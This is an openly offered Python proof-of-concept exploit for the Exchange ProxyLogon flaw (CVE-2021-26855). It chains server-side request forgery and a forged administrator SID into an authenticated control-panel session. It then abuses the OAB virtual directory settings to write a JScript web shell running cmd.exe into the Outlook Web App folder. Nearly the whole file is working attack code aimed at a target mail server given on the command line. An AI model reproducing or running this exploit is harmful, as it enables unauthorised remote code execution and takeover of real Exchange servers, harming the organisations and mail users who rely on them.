# Name: Exchange ProxyLogon CVE-2021-26855 File Arbitrary Write to RCE PoC
# Author: Celesian, Thau0x01
#

import requests
from urllib3.exceptions import InsecureRequestWarning
import random
import string
import sys


def id_generator(size=6, chars=string.ascii_lowercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))

if len(sys.argv) < 2:
	print("Usage: python PoC.py <target> <email>")
	print("Example: python PoC.py mail.evil.corp haxor@evil.corp")
	exit()
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
target = sys.argv[1]
email = sys.argv[2]
random_name = id_generator(3) + ".js"
user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36"

shell_path = "Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\ahihi7.aspx"
shell_absolute_path = "\\\\127.0.0.1\\c$\\%s" % shell_path

shell_content = '<script language="JScript" runat="server">/**/function Page_Load(){Response.Write(new ActiveXObject("WScript.Shell").exec("cmd.exe /c whoami").stdout.readall())}</script>'
legacyDnPatchByte = "68747470733a2f2f696d6775722e636f6d2f612f7a54646e5378670a0a0a0a0a0a0a0a"
autoDiscoverBody = """<Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006">
    <Request>
      <EMailAddress>%s</EMailAddress> <AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema>
    </Request>
</Autodiscover>
""" % email

print("Attacking target " + target)
print("=============================")
print(legacyDnPatchByte.decode('hex'))
FQDN = "EXCHANGE2016"
ct = requests.get("https://%s/ecp/%s" % (target, random_name), headers={"Cookie": "X-BEResource=localhost~1942062522",
                                                                        "User-Agent": user_agent},
                  verify=False)
if "X-CalculatedBETarget" in ct.headers and "X-FEServer" in ct.headers:
    FQDN = ct.headers["X-FEServer"]

ct = requests.post("https://%s/ecp/%s" % (target, random_name), headers={
    "Cookie": "X-BEResource=%s/autodiscover/autodiscover.xml?a=~1942062522;" % FQDN,
    "Content-Type": "text/xml",
    "User-Agent": user_agent,             "X-Requesttype": "Connect",
                  "X-Clientinfo": "{2F94A2BF-A2E6-4CCCC-BF98-B5F22C542226}",
              "X-Clientapplication": "Outlook/15.0.4815.1002",
              "X-Requestid": "{C715155F-2BE8-44E0-BD34-2960067874C8}:2",
              "User-Agent": "Hello-World"},
                   data=autoDiscoverBody,
                   verify=False
                   )
if ct.status_code != 200:
    print("Autodiscover Error!")
    exit()
if "<LegacyDN>" not in ct.content:
    print("Can not get LegacyDN!")
    exit()

legacyDn = ct.content.split("<LegacyDN>")[1].split("</LegacyDN>")[0]
print("Got DN: " + legacyDn)

mapi_body = legacyDn + "\x00\x00\x00\x00\x00\xe4\x04\x00\x00\x09\x04\x00\x00\x09\x04\x00\x00\x00\x00\x00\x00"
request_id = 1337
ct = requests.post("https://%s/ecp/%s" % (target, random_name), headers={
    "Cookie": "X-BEResource=Admin@%s:444/mapi/emsmdb?MailboxId=f26bc937-b7b3-4402-b890-96c46713e5d5@exchange.lab&a=~1942062522;" % FQDN,
    "Content-Type": "application/mapi-http",
    "User-Agent": user_agent,             "X-Requesttype": "Connect",
              "X-Clientinfo": "{2F94A2BF-A2E6-4CCCC-BF98-B5F22C542226}",
              "X-Clientapplication": "Outlook/15.0.4815.1002",
              "X-Requestid": "{C715155F-2BE8-44E0-BD34-2960067874C8}:2",
              "User-Agent": "Hello-World"
},
                   data=mapi_body,
                   verify=False
                   )
request_id += 1
if ct.status_code != 200 or "act as owner of a UserMailbox" not in ct.content:
    print(ct.content)
    print("Mapi Error!")
    exit()

sid = ct.content.split("with SID ")[1].split(" and MasterAccountSid")[0]

print("Got SID: " + sid)


admin_sid = sid.split('-')
admin_sid[-1] = '500'
print(admin_sid)
admin_sid = '-'.join(admin_sid)
print(admin_sid)
proxyLogon_request = """<r at="Negotiate" ln="%s"><s>%s</s><s a="7" t="1">S-1-1-0</s><s a="7" t="1">S-1-5-2</s><s a="7" t="1">S-1-5-11</s><s a="7" t="1">S-1-5-15</s><s a="3221225479" t="1">S-1-5-5-0-6948923</s></r>
""" % ("admin", admin_sid)
print(proxyLogon_request)

ct = requests.post("https://%s/ecp/%s" % (target, random_name), headers={
    "Cookie": "X-BEResource=Admin@%s:444/ecp/proxyLogon.ecp?a=~1942062522;" % FQDN,
    "Content-Type": "text/xml",
    "User-Agent": user_agent,             "X-Requesttype": "Execute",

              "msExchLogonAccount":admin_sid,
              "msExchLogonMailbox":admin_sid,
              "msExchProxyUri":"http://127.0.0.1:8080/",
              "msExchTargetMailbox":admin_sid,
              #"msExchTargetMailbox":"S-1-1-0",

},
                   data=proxyLogon_request,
                   verify=False
                   )
request_id += 1

if ct.status_code != 241 or not "set-cookie" in ct.headers:
    print("Proxylogon Error!")
    exit()

sess_id = ct.headers['set-cookie'].split("ASP.NET_SessionId=")[1].split(";")[0]
msExchEcpCanary = ct.headers['set-cookie'].split("msExchEcpCanary=")[1].split(";")[0]
#msExchEcpCanary = ct.headers['set-cookie'].split("ASP.NET_SessionId=")[1].split(";")[0]
print("Got session id: " + sess_id)
print("Got canary: " + msExchEcpCanary)

ct = requests.get("https://%s/ecp/%s" % (target, random_name), headers={
    "Cookie": "X-BEResource=Admin@%s:444/ecp/about.aspx?msExchEcpCanary=%s&a=~1942062522; ASP.NET_SessionId=%s; msExchEcpCanary=%s;" % (
        FQDN, msExchEcpCanary, sess_id, msExchEcpCanary),
    "User-Agent": user_agent,
                  "msExchLogonAccount":admin_sid,
              "msExchLogonMailbox":admin_sid,
              "msExchProxyUri":"http://127.0.0.1:8080/",
              "msExchTargetMailbox":admin_sid,
},
                  verify=False
                  )
if ct.status_code != 200:
    print("Wrong canary!")
    print("Sometime we can skip this ...")
rbacRole = ct.content.split("RBAC roles:</span> <span class='diagTxt'>")[1].split("</span>")[0]

print "Got rbacRole: "+ rbacRole

print("=========== It means good to go!!!====")

ct = requests.post("https://%s/ecp/%s" % (target, random_name), headers={
    "Cookie": "X-BEResource=Admin@%s:444/ecp/DDI/DDIService.svc/GetObject?schema=OABVirtualDirectory&msExchEcpCanary=%s&a=~1942062522; ASP.NET_SessionId=%s; msExchEcpCanary=%s" % (
        FQDN, msExchEcpCanary, sess_id, msExchEcpCanary),
    "Content-Type": "application/json; charset=utf-8",
    "User-Agent": user_agent,             "X-Requesttype": "Execute",

                  "X-Clientinfo": "{2F94A2BF-A2E6-4CCCC-BF98-B5F22C542226}",
              "X-Clientapplication": "Outlook/15.0.4815.1002",
              "X-Requestid": "{C715155F-2BE8-44E0-BD34-2960067874C8}:2",
              "User-Agent": "Hello-World",
                                "msExchLogonAccount":admin_sid,
              "msExchLogonMailbox":admin_sid,
              "msExchProxyUri":"http://127.0.0.1:8080/",
              "msExchTargetMailbox":admin_sid,

},
                   json={"filter": {
                       "Parameters": {"__type": "JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel",
                                      "SelectedView": "", "SelectedVDirType": "All"}}, "sort": {}},
                   verify=False
                   )
if ct.status_code != 200:
    print("GetOAB Error!")
    exit()
oabId = ct.content.split('"RawIdentity":"')[1].split('"')[0]
print("Got OAB id: " + oabId)

oab_json = {"identity": {"__type": "Identity:ECP", "DisplayName": "OAB (Default Web Site)", "RawIdentity": oabId},
            "properties": {
                "Parameters": {"__type": "JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel",
                               "ExternalUrl": "http://ffff/%s" % shell_content}}}

ct = requests.post("https://%s/ecp/%s" % (target, random_name), headers={
    "Cookie": "X-BEResource=Admin@%s:444/ecp/DDI/DDIService.svc/SetObject?schema=OABVirtualDirectory&msExchEcpCanary=%s&a=~1942062522; ASP.NET_SessionId=%s; msExchEcpCanary=%s" % (
        FQDN, msExchEcpCanary, sess_id, msExchEcpCanary),
    "Content-Type": "application/json; charset=utf-8",
    "User-Agent": user_agent,
                      "msExchLogonAccount":admin_sid,
              "msExchLogonMailbox":admin_sid,
              "msExchProxyUri":"http://127.0.0.1:8080/",
              "msExchTargetMailbox":admin_sid,
},
                   json=oab_json,
                   verify=False
                   )
if ct.status_code != 200:
    print("Set external url Error!")
    exit()

reset_oab_body = {"identity": {"__type": "Identity:ECP", "DisplayName": "OAB (Default Web Site)", "RawIdentity": oabId},
                  "properties": {
                      "Parameters": {"__type": "JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel",
                                     "FilePathName": shell_absolute_path}}}

ct = requests.post("https://%s/ecp/%s" % (target, random_name), headers={
    "Cookie": "X-BEResource=Admin@%s:444/ecp/DDI/DDIService.svc/SetObject?schema=ResetOABVirtualDirectory&msExchEcpCanary=%s&a=~1942062522; ASP.NET_SessionId=%s; msExchEcpCanary=%s" % (
        FQDN, msExchEcpCanary, sess_id, msExchEcpCanary),
    "Content-Type": "application/json; charset=utf-8",
    "User-Agent": user_agent,
                      "msExchLogonAccount":admin_sid,
              "msExchLogonMailbox":admin_sid,
              "msExchProxyUri":"http://127.0.0.1:8080/",
              "msExchTargetMailbox":admin_sid,
},
                   json=reset_oab_body,
                   verify=False
                   )

if ct.status_code != 200:
    print("Write Shell Error!")
    exit()

print("Successful!")
